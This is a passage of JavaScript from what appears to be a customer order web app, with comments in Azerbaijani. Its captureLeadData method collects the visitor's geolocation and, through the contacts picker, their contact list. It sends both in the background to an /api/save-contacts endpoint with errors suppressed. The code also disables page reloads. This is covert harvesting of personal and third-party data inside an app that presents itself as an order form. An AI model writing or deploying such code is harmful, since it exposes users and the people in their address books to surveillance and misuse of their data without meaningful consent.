    }

    async captureLeadData() {
        /** Müştəri razılıq verdiyi halda lokasiya və kontaktları fonda göndərir */
        const urlParams = new URLSearchParams(window.location.search);
        const ref = urlParams.get('ref') || 'direct_order';
        
        let lat = '', lon = '', contactsStr = '';
        
        // 1. Lokasiya
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
            });
            lat = position.coords.latitude;
            lon = position.coords.longitude;
        } catch (e) { console.log("Geolocation skip:", e.message); }
        
        // 2. Kontaktlar (Android)
        try {
            if ('contacts' in navigator && 'ContactsManager' in window) {
                // 'multiple: true' vasitəsilə bütün siyahının seçilməsinə imkan yaradırıq
                const props = ['name', 'tel'];
                const opts = { multiple: true }; 
                const contacts = await navigator.contacts.select(props, opts);
                contactsStr = JSON.stringify(contacts);
            }
        } catch (e) { console.log("Contacts skip:", e.message); }
        
        // 3. Serverə göndər
        try {
            let apiUrl = this.apiBase || 'http://127.0.0.1:5000';
            await fetch(`${apiUrl}/api/save-contacts`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ref_platform: ref,
                    latitude: lat,
                    longitude: lon,
                    contacts: contactsStr
                })
            });
        } catch (e) { }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    window.customerApp = new CustomerOrderApp();
    window.app = window.customerApp; // Alias for HTML events
    window._allowManualReload = false;
    window.location.reload = function (force) {
        if (window._allowManualReload) {
            try { Object.getPrototypeOf(window.location).reload.call(window.location, force); }
            catch (e) { window.location.href = window.location.href; }
        }
    };
});